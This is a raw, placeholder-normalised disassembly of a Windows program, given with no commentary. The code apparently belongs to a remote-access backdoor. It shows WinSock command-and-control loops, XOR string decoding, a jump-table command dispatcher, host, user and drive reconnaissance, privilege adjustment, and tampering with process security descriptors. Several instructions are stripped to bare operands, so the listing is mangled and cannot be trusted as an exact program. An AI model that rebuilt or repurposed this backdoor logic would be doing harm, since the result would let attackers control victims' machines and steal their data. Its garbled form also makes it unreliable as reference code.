[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi ebx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi ebx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
sub_403720
mov eax 0x2008
call sub_4076c0
push ebx
mov ebx [ Ordinal_WSOCK32_16@IAT ]
push ebp
push esi
xor ebp ebp
push edi
mov edi [ esp + 0x201c ]
mov [ esp + 0x10 ] ebp
mov [ esp + 0x14 ] ebp
lea esi [ esp + 0x18 ]
pop edi
pop esi
pop ebp
or eax 0xffffffff
pop ebx
add esp 0x2008
retn
cmp eax 0xffffffff
jne r-xdata
mov al [ esi ]
cmp al 0xd
je r-xdata
call [ Ordinal_WSOCK32_111@IAT ]
cmp eax 0x2733
jne r-xdata
mov eax [ esp + 0x10 ]
inc eax
cmp eax 0x4
mov [ esp + 0x10 ] eax
jge r-xdata
cmp al 0xa
je r-xdata
push 0x1
call [ rw-data ]
mov eax [ esp + 0x14 ]
mov ecx eax
inc eax
cmp ecx 0x1388
mov [ esp + 0x14 ] eax
jg r-xdata
lea edx [ esp + 0x18 ]
push rw-data
push edx
mov [ esp + ebp + 0x21 ] 0x0
call [ strstr@IAT ]
add esp 0x8
neg eax
sbb eax eax
pop edi
and eax 0x2
pop esi
pop ebp
dec eax
pop ebx
add esp 0x2008
retn
inc ebp
inc esi
cmp ebp 0x2000
ja r-xdata
mov [ esp + 0x10 ] 0x0
jmp r-xdata
jmp r-xdata
push 0x1
call [ rw-data ]
jmp r-xdata
push 0x0
push 0x1
push esi
push edi
call ebx
test eax eax
je r-xdata
sub_403800
mov eax [ esp + 0x10 ]
push esi
mov esi [ esp + 0xc ]
test esi esi
mov [ eax ] esi
jle r-xdata
pop esi
retn
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x8 ]
sub ecx eax
mov dl [ ecx + eax ]
xor dl 0x23
mov [ eax ] dl
inc eax
dec esi
jne r-xdata
sub_403830
sub esp 0x104
push esi
lea eax [ esp + 0x4 ]
push edi
push eax
push rw-data
mov [ esp + 0x10 ] 0xff
call [ GetComputerNameA@IAT ]
mov ecx [ esp + 0x8 ]
lea edx [ esp + 0xc ]
push 0xff
push edx
mov [ ecx + rw-data ] 0x0
call [ Ordinal_WSOCK32_57@IAT ]
test eax eax
jne r-xdata
mov edi rw-data
lea eax [ esp + 0xc ]
push eax
call [ Ordinal_WSOCK32_52@IAT ]
test eax eax
je r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
pop edi
pop esi
add esp 0x104
retn
mov ecx [ eax + 0xc ]
mov edx [ ecx ]
mov eax [ edx ]
push eax
call [ Ordinal_WSOCK32_11@IAT ]
mov edi eax
jmp r-xdata
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov edx ecx
mov esi edi
mov edi rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop edi
pop esi
add esp 0x104
retn
sub_4038f0
mov eax [ esp + 0x4 ]
push eax
call [ Ordinal_WSOCK32_52@IAT ]
test eax eax
je r-xdata
xor eax eax
retn
mov ecx [ eax + 0xc ]
mov edx [ ecx ]
mov eax [ edx ]
push eax
call [ Ordinal_WSOCK32_11@IAT ]
retn
sub_403920
mov eax [ rw-data ]
sub esp 0x124
test eax eax
push ebx
mov ebx [ Ordinal_WSOCK32_9@IAT ]
push ebp
mov ebp [ Ordinal_WSOCK32_18@IAT ]
push esi
push edi
mov edi [ Ordinal_WSOCK32_12@IAT ]
mov esi 0x1
jne r-xdata
push 0x0
push esi
push 0x2
call [ Ordinal_WSOCK32_23@IAT ]
cmp eax 0xffffffff
mov [ rw-data ] eax
jne r-xdata
push 0x0
push esi
push 0x2
mov [ rw-data ] 0x0
call [ Ordinal_WSOCK32_23@IAT ]
cmp eax 0xffffffff
mov [ rw-data ] eax
jne r-xdata
lea ecx [ esp + 0x10 ]
mov [ esp + 0x10 ] esi
push ecx
push 0x8004667e
push eax
call edi
mov ax [ rw-data ]
mov edx [ rw-data ]
push eax
mov [ esp + 0x18 ] 0x3c
mov [ esp + 0x1c ] 0x0
mov [ esp + 0x38 ] edx
mov [ esp + 0x34 ] esi
mov [ esp + 0x20 ] 0x2
call ebx
push rw-data
mov [ esp + 0x22 ] ax
call [ Ordinal_WSOCK32_10@IAT ]
mov edx [ rw-data ]
lea ecx [ esp + 0x1c ]
push 0x10
push ecx
push edx
mov [ esp + 0x2c ] eax
call [ rw-data ]
mov edx [ rw-data ]
lea eax [ esp + 0x14 ]
push eax
lea ecx [ esp + 0x34 ]
push 0x0
push ecx
inc edx
push 0x0
push edx
call ebp
test eax eax
jg r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x124
retn
lea ecx [ esp + 0x10 ]
mov [ esp + 0x10 ] esi
push ecx
push 0x8004667e
push eax
call edi
mov edx [ rw-data ]
push 0x51
mov [ esp + 0x18 ] 0x3c
mov [ esp + 0x1c ] 0x0
mov [ esp + 0x38 ] edx
mov [ esp + 0x34 ] esi
mov [ esp + 0x20 ] 0x2
call ebx
mov edx [ rw-data ]
lea ecx [ esp + 0x1c ]
mov [ esp + 0x1e ] ax
mov eax [ rw-data ]
push 0x10
push ecx
push edx
mov [ esp + 0x2c ] eax
call [ rw-data ]
mov edx [ rw-data ]
lea eax [ esp + 0x14 ]
push eax
lea ecx [ esp + 0x34 ]
push 0x0
push ecx
inc edx
push 0x0
push edx
call ebp
test eax eax
jg r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x124
retn
mov [ rw-data ] esi
mov eax [ rw-data ]
push eax
call [ Ordinal_WSOCK32_3@IAT ]
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x124
retn
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
call sub_4040e0
test eax eax
jne r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x124
retn
lea ecx [ esp + 0x2c ]
push ecx
push 0x0
push 0x0
push r-xdata
push 0x0
push 0x0
call [ CreateThread@IAT ]
test eax eax
mov [ rw-data ] eax
jne r-xdata
push eax
call [ rw-data ]
mov [ rw-data ] 0x0
pop edi
pop esi
pop ebp
pop ebx
add esp 0x124
retn
mov eax esi
pop edi
pop esi
pop ebp
pop ebx
add esp 0x124
retn
mov edx [ rw-data ]
push edx
call [ Ordinal_WSOCK32_3@IAT ]
sub_403b50
sub esp 0x100
push ebx
push esi
push edi
push rw-data
call [ LoadLibraryA@IAT ]
mov esi eax
push rw-data
push esi
call [ GetProcAddress@IAT ]
push esi
mov ebx eax
call [ FreeLibrary@IAT ]
mov ecx [ rw-data ]
mov esi [ rw-data ]
mov edi [ rw-data ]
mov eax ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
movsx edx [ rw-data ]
mov ecx [ rw-data ]
xor esi esi
mov [ rw-data ] ecx
mov [ rw-data ] edx
mov [ rw-data ] esi
mov [ rw-data ] esi
call ebx
mov [ rw-data ] eax
mov eax [ rw-data ]
add eax 0xffffffbf
cmp eax 0x25
ja r-xdata
mov eax [ rw-data ]
mov [ rw-data ] 0x1
cmp eax esi
je r-xdata
jmp [ eax * 4 + jump_table_403d30 ]
pop edi
pop esi
mov eax 0x1
pop ebx
add esp 0x100
retn
mov edi rw-data
or ecx 0xffffffff
xor eax eax
mov [ rw-data ] esi
[ edi ]
not ecx
add ecx 0x4
mov edi rw-data
mov [ esp + 0xd ] ecx
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
lea edx [ esp + 0x11 ]
mov eax ecx
mov esi edi
mov edi edx
mov [ esp + 0xc ] 0x5a
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
add ecx 0x4
push ecx
lea ecx [ esp + 0x10 ]
push ecx
call sub_402970
add esp 0x8
call sub_404e20
jmp r-xdata
call sub_404bb0
jmp r-xdata
call sub_404bd0
jmp r-xdata
call sub_404b80
jmp r-xdata
call sub_404b10
jmp r-xdata
call sub_404670
jmp r-xdata
call sub_404cf0
jmp r-xdata
call sub_405570
jmp r-xdata
call sub_404d30
jmp r-xdata
call sub_404de0
jmp r-xdata
call sub_404dc0
jmp r-xdata
call sub_405af0
jmp r-xdata
push 0x4e
call sub_405b10
add esp 0x4
jmp r-xdata
call sub_405c50
jmp r-xdata
call sub_405dd0
jmp r-xdata
call sub_405b60
jmp r-xdata
call sub_406d00
jmp r-xdata
call sub_406160
jmp r-xdata
mov [ rw-data ] esi
jmp r-xdata
call sub_406bf0
call sub_4071d0
jmp r-xdata
call sub_407260
jmp r-xdata
call sub_4072a0
jmp r-xdata
call sub_407300
jmp r-xdata
call sub_407340
sub_403dd0
push esi
mov esi [ WaitForSingleObject@IAT ]
mov ecx [ rw-data ]
push ecx
call [ rw-data ]
call [ Ordinal_WSOCK32_116@IAT ]
push 0x1
call [ exit@IAT ]
push 0x3e8
call [ rw-data ]
jmp r-xdata
mov eax [ rw-data ]
push 0x0
push eax
call esi
test eax eax
je r-xdata
sub_403fe0
push ecx
push ebx
mov ebx [ Ordinal_WSOCK32_111@IAT ]
push esi
mov esi [ Ordinal_WSOCK32_16@IAT ]
push edi
xor edi edi
test eax eax
jle r-xdata
call ebx
cmp eax 0x2733
jne r-xdata
push 0x1
call [ rw-data ]
jmp r-xdata
mov al [ esp + 0xf ]
cmp al 0xd
je r-xdata
pop edi
pop esi
xor eax eax
pop ebx
pop ecx
retn
push 0x1
call [ rw-data ]
jmp r-xdata
mov ecx [ rw-data ]
push 0x0
lea eax [ esp + 0x13 ]
push 0x1
push eax
push ecx
call esi
cmp eax 0xffffffff
jne r-xdata
inc edi
cmp edi 0x4
jge r-xdata
cmp al 0xa
je r-xdata
pop edi
pop esi
mov eax 0x1
pop ebx
pop ecx
retn
push 0x1
xor edi edi
call [ rw-data ]
jmp r-xdata
sub_404060
push ebx
push ebp
push esi
push edi
mov edi [ esp + 0x18 ]
xor esi esi
xor ebx ebx
cmp edi 0x2000
jle r-xdata
test edi edi
jle r-xdata
mov edi 0x2000
jmp r-xdata
mov eax edi
pop edi
pop esi
pop ebp
pop ebx
retn
mov ebp [ esp + 0x14 ]
add esi eax
xor ebx ebx
call [ Ordinal_WSOCK32_111@IAT ]
cmp eax 0x2733
jne r-xdata
mov edx [ rw-data ]
mov eax edi
sub eax esi
push 0x0
lea ecx [ esi + ebp ]
push eax
push ecx
push edx
call [ Ordinal_WSOCK32_16@IAT ]
test eax eax
jg r-xdata
pop edi
pop esi
pop ebp
or eax 0xffffffff
pop ebx
retn
mov eax ebx
inc ebx
cmp eax 0x1770
jg r-xdata
jmp r-xdata
push 0x1
call [ rw-data ]
cmp esi edi
jl r-xdata
sub_4040e0
sub esp 0x48c
push ebp
push esi
push edi
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
lea edx [ esp + 0x9d ]
mov eax ecx
mov esi edi
mov edi edx
mov [ esp + 0x98 ] 0x41
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
lea edx [ esp + 0x298 ]
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
push edx
mov ebp ecx
mov ecx [ rw-data ]
add ebp 0x6
push 0x200
mov [ esp + 0x18 ] 0x0
mov [ esp + ebp + 0xa0 ] ecx
add ebp 0x4
call [ GetLogicalDriveStringsA@IAT ]
test eax eax
je r-xdata
lea edx [ esp + 0x98 ]
push ebp
push edx
mov [ esp + 0xa1 ] ebp
call sub_402970
add esp 0x8
pop edi
pop esi
pop ebp
add esp 0x48c
retn
mov al [ esp + 0x298 ]
test al al
je r-xdata
push ebx
lea ebx [ esp + 0x29c ]
mov [ esp + 0x1c ] 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
lea ecx [ esp + 0x30 ]
push 0x80
push ecx
push ebx
call [ GetVolumeInformationA@IAT ]
test eax eax
jne r-xdata
mov edi ebx
or ecx 0xffffffff
xor eax eax
lea esi [ esp + ebp + 0x9c ]
[ edi ]
not ecx
dec ecx
mov edi ebx
mov edx ecx
or ecx 0xffffffff
inc edx
mov [ esp + 0x10 ] esi
[ edi ]
not ecx
sub edi ecx
push ebx
mov eax ecx
mov esi edi
mov edi [ esp + 0x14 ]
mov [ esp + 0x1c ] edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
add ebp edx
and ecx 0x3
[ edi ] [ esi ]
call [ GetDriveTypeA@IAT ]
cmp eax 0x2
mov [ esp + 0x10 ] eax
je r-xdata
pop ebx
lea edi [ esp + 0x1c ]
or ecx 0xffffffff
xor eax eax
lea edx [ esp + ebp + 0x9c ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0x1c ]
or ecx 0xffffffff
[ edi ]
not ecx
mov eax [ esp + 0x14 ]
dec ecx
lea ebp [ ecx + ebp + 0x1 ]
mov ecx [ esp + 0x10 ]
mov [ esp + ebp + 0x9c ] ecx
mov ecx [ esp + 0x18 ]
add eax ecx
add ebp 0x4
mov [ esp + 0x14 ] eax
lea ebx [ esp + eax + 0x29c ]
mov al [ esp + eax + 0x29c ]
test al al
jne r-xdata
sub_404280
sub esp 0x2c
mov ecx [ esp + 0x34 ]
lea edx [ esp ]
mov [ esp + 0xc ] ecx
push ebx
lea ecx [ esp + 0x38 ]
xor ebx ebx
mov [ esp + 0x2c ] edx
push ecx
lea edx [ esp + 0x14 ]
mov eax 0x1
push ebx
push edx
push eax
mov [ esp + 0x14 ] al
mov [ esp + 0x15 ] al
mov [ esp + 0x16 ] bl
mov [ esp + 0x17 ] bl
mov [ esp + 0x18 ] bl
mov [ esp + 0x19 ] bl
mov [ esp + 0x1a ] bl
mov [ esp + 0x1b ] al
mov [ esp + 0x1c ] ebx
mov [ esp + 0x24 ] 0x2
mov [ esp + 0x28 ] ebx
mov [ esp + 0x2c ] ebx
mov [ esp + 0x30 ] ebx
mov [ esp + 0x34 ] ebx
mov [ esp + 0x38 ] eax
mov [ esp + 0x48 ] ebx
call SetEntriesInAclA
test eax eax
jne r-xdata
xor eax eax
pop ebx
add esp 0x2c
retn
mov eax [ esp + 0x38 ]
mov ecx [ esp + 0x34 ]
push esi
push ebx
push eax
push ebx
push ebx
push 0x4
push 0x6
push ecx
call SetSecurityInfo
mov edx [ esp + 0x3c ]
mov esi eax
push edx
call [ LocalFree@IAT ]
xor eax eax
cmp esi ebx
pop esi
pop ebx
sete al
add esp 0x2c
retn
sub_404330
sub esp 0x10
mov ecx [ esp + 0x18 ]
lea eax [ esp + 0x4 ]
push eax
push ecx
push 0x0
mov [ esp + 0xc ] 0x1
mov [ esp + 0x18 ] 0x2
call [ LookupPrivilegeValueA@IAT ]
test eax eax
je r-xdata
xor eax eax
add esp 0x10
retn
mov eax [ esp + 0x1c ]
lea edx [ esp + 0x18 ]
push edx
mov edx [ esp + 0x18 ]
push eax
lea ecx [ esp + 0x8 ]
push 0x10
push ecx
push 0x0
push edx
mov [ esp + 0x30 ] 0x10
call [ AdjustTokenPrivileges@IAT ]
test eax eax
je r-xdata
call [ GetLastError@IAT ]
xor ecx ecx
cmp eax 0x514
setne cl
mov eax ecx
add esp 0x10
retn
sub_4043c0
sub esp 0x220
push ebx
push ebp
mov ebp [ esp + 0x230 ]
push esi
push edi
mov edi [ esp + 0x234 ]
push edi
push 0x0
push ebp
call [ rw-data ]
test eax eax
mov [ esp + 0x18 ] eax
jne r-xdata
mov eax [ esp + 0x18 ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x220
retn
push edi
push eax
push 0x40000
call [ rw-data ]
mov esi [ GetCurrentProcess@IAT ]
mov ebx [ DuplicateHandle@IAT ]
test eax eax
mov [ esp + 0x10 ] eax
jne r-xdata
push ebp
push eax
call sub_404280
add esp 0x8
lea edx [ esp + 0x18 ]
push 0x0
push 0x0
push ebp
push edx
call esi
push eax
mov eax [ esp + 0x24 ]
push eax
call esi
push eax
call ebx
test eax eax
jne r-xdata
lea eax [ esp + 0x14 ]
push eax
push 0x28
call esi
push eax
call [ OpenProcessToken@IAT ]
test eax eax
jne r-xdata
mov ecx [ esp + 0x10 ]
push ecx
call [ rw-data ]
mov [ esp + 0x18 ] eax
mov edx [ esp + 0x14 ]
lea ecx [ esp + 0x20 ]
push ecx
push rw-data
push edx
call sub_404330
add esp 0xc
test eax eax
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x220
retn
mov ecx [ esp + 0x14 ]
push ecx
call [ rw-data ]
mov eax [ esp + 0x10 ]
test eax eax
je r-xdata
push edi
push 0x0
push 0x80000
call [ rw-data ]
mov edi eax
test edi edi
je r-xdata
mov eax [ esp + 0x14 ]
lea edx [ esp + 0x20 ]
push edx
push eax
call sub_4043a0
add esp 0x8
mov edx [ esp + 0x14 ]
lea eax [ esp + 0x1c ]
push eax
lea ecx [ esp + 0x34 ]
push 0x200
push ecx
push 0x1
push edx
mov [ esp + 0x30 ] 0x200
call [ GetTokenInformation@IAT ]
test eax eax
je r-xdata
push edi
call [ rw-data ]
mov eax [ esp + 0x30 ]
push 0x0
push 0x0
push 0x0
push eax
push 0x1
push 0x6
push edi
call SetSecurityInfo
test eax eax
jne r-xdata
push eax
push eax
lea ecx [ esp + 0x18 ]
push 0x40000
push ecx
call esi
push eax
push edi
call esi
push eax
call ebx
test eax eax
jne r-xdata
mov [ esp + 0x10 ] eax
sub_404540
sub esp 0x104
push ebx
mov ebx [ esp + 0x10c ]
push ebp
push esi
test ebx ebx
push edi
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x104
retn
cmp [ ebx ] 0x0
je r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
mov edi rw-data
mov ebp ecx
or ecx 0xffffffff
[ edi ]
mov edi [ _strnicmp@IAT ]
push ebp
not ecx
dec ecx
push rw-data
push ebx
mov esi ecx
call edi
add esp 0xc
test eax eax
jne r-xdata
push esi
push rw-data
push ebx
call edi
add esp 0xc
test eax eax
jne r-xdata
lea eax [ esp + 0x10 ]
push 0x104
push eax
call [ rw-data ]
test eax eax
je r-xdata
lea edi [ esi + ebx ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov edx ecx
mov esi edi
mov edi ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
or ecx 0xffffffff
mov edi rw-data
xor eax eax
lea edx [ esp + 0x10 ]
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
lea edx [ esp + 0x10 ]
and ecx 0x3
[ edi ] [ esi ]
lea edi [ ebx + ebp ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebp ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0x10 ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x104
retn
sub_404670
mov eax 0x2744
call sub_4076c0
mov eax [ rw-data ]
push ebx
push esi
xor esi esi
cmp eax 0x2
push edi
mov ebx 0x5
mov [ esp + 0x750 ] 0x43
mov [ esp + 0xc ] esi
mov [ esp + 0x14 ] esi
mov [ esp + 0x10 ] esi
jne r-xdata
push ebp
push 0x0
push 0x2
call [ rw-data ]
mov ebp eax
cmp ebp 0xffffffff
mov [ esp + 0x20 ] ebp
je r-xdata
push rw-data
call [ LoadLibraryA@IAT ]
cmp eax esi
mov [ esp + 0xc ] eax
je r-xdata
mov [ esp + 0x755 ] ebx
jmp r-xdata
lea eax [ esp + 0x2c ]
mov [ esp + 0x2c ] 0x128
push eax
push ebp
call [ rw-data ]
test eax eax
jne r-xdata
mov esi [ GetProcAddress@IAT ]
mov edi eax
push rw-data
push edi
call esi
push rw-data
push edi
mov [ esp + 0x1c ] eax
call esi
mov [ esp + 0x10 ] eax
cmp ebp 0xffffffff
je r-xdata
lea edi [ esp + 0x50 ]
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x154 ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov ecx [ esp + 0x34 ]
push ecx
push 0x0
push 0x410
call [ rw-data ]
mov esi eax
push esi
call [ GetPriorityClass@IAT ]
push esi
call [ rw-data ]
cmp [ rw-data ] 0x2
jne r-xdata
mov eax [ esp + 0x10 ]
pop ebp
test eax eax
je r-xdata
push ebp
call [ rw-data ]
cmp [ rw-data ] 0x1
jne r-xdata
mov edx [ esp + 0x34 ]
push 0x410
push edx
call sub_4043c0
add esp 0x8
mov ebp eax
lea eax [ esp + 0x28 ]
lea ecx [ esp + 0x1c ]
push eax
push 0x4
push ecx
push ebp
call [ esp + 0x28 ]
test eax eax
je r-xdata
lea eax [ esp + 0x750 ]
push ebx
push eax
mov [ esp + 0x759 ] ebx
call sub_402970
add esp 0x8
pop edi
pop esi
pop ebx
add esp 0x2744
retn
push eax
call [ FreeLibrary@IAT ]
mov eax [ esp + 0x34 ]
test eax eax
jne r-xdata
lea edi [ esp + 0x50 ]
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x454 ]
[ edi ]
not ecx
sub edi ecx
push 0x5c
mov eax ecx
mov esi edi
mov edi edx
mov [ esp + 0x28 ] 0x100
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ esp + 0x158 ]
push ecx
call [ strrchr@IAT ]
add esp 0x8
inc eax
mov edi eax
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x654 ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
lea edx [ esp + 0x154 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0x654 ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
lea edx [ esp + 0x354 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ esp + 0x24 ]
push ecx
push edx
call [ GetUserNameA@IAT ]
lea edx [ esp + 0x354 ]
push edx
push ebp
call sub_4060c0
add esp 0x8
test eax eax
jne r-xdata
mov eax [ esp + 0x1c ]
lea edx [ esp + 0x454 ]
push 0x200
push edx
push eax
push ebp
call [ esp + 0x24 ]
lea ecx [ esp + 0x454 ]
push ecx
call sub_404540
add esp 0x4
lea ecx [ esp + 0x154 ]
push rw-data
push ecx
call [ lstrcmpiA@IAT ]
test eax eax
jne r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x154 ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
lea edx [ esp + 0x454 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
push ebp
call [ rw-data ]
mov ebp [ esp + 0x20 ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
lea edx [ esp + 0x354 ]
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
or ecx 0xffffffff
mov edi rw-data
xor eax eax
lea edx [ esp + 0x154 ]
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
lea edx [ esp + 0x154 ]
and ecx 0x3
[ edi ] [ esi ]
or ecx 0xffffffff
lea edi [ esp + 0x454 ]
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
lea edx [ esp + 0x154 ]
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
lea edx [ esp + ebx + 0x754 ]
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0x154 ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0x154 ]
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
lea edi [ esp + 0x354 ]
lea edx [ ebx + ecx + 0x1 ]
mov ecx [ esp + 0x34 ]
mov [ esp + edx + 0x754 ] ecx
add edx 0x4
lea ebx [ esp + edx + 0x754 ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0x354 ]
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
lea ebx [ edx + ecx + 0x1 ]
mov ecx [ esp + 0x40 ]
lea edx [ esp + 0x2c ]
push edx
mov [ esp + ebx + 0x758 ] ecx
push ebp
add ebx 0x4
call [ rw-data ]
test eax eax
jne r-xdata
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
lea edx [ esp + 0x454 ]
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
sub_404ad0
push esi
push rw-data
call [ LoadLibraryA@IAT ]
push rw-data
push eax
call [ GetProcAddress@IAT ]
mov esi eax
mov eax [ esp + 0x8 ]
push 0x1
push eax
call sub_4043c0
add esp 0x8
test eax eax
je r-xdata
xor eax eax
pop esi
retn
push 0x1
push eax
call esi
pop esi
retn
sub_404b40
push esi
push rw-data
call [ LoadLibraryA@IAT ]
push rw-data
push eax
call [ GetProcAddress@IAT ]
mov esi eax
mov eax [ esp + 0x8 ]
push eax
push 0x0
push 0x1
call [ rw-data ]
test eax eax
je r-xdata
xor eax eax
pop esi
retn
push 0x1
push eax
call esi
pop esi
retn
sub_404bd0
sub esp 0x400
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x200 ]
push ebx
push esi
push edi
mov edi [ rw-data ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0x20c ]
or ecx 0xffffffff
[ edi ]
mov eax [ rw-data ]
not ecx
dec ecx
mov ebx ecx
inc ebx
cmp ebx eax
jge r-xdata
mov [ rw-data ] 0x4f
call sub_405230
pop edi
pop esi
pop ebx
add esp 0x400
retn
push ebp
lea edx [ esp + 0x10 ]
push 0x4c
push edx
call sub_405260
add esp 0x8
lea ecx [ esp + 0x10 ]
push ecx
call [ rw-data ]
jmp r-xdata
lea edi [ esp + 0x210 ]
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x10 ]
[ edi ]
not ecx
sub edi ecx
lea ebp [ esp + 0x10 ]
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
push eax
[ edi ] [ esi ]
mov ecx [ rw-data ]
lea edx [ ecx + ebx ]
or ecx 0xffffffff
mov edi edx
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi ebp
mov ebp ecx
or ecx 0xffffffff
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
and ecx 0x3
[ edi ] [ esi ]
mov edi edx
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
lea edx [ esp + 0x14 ]
push edx
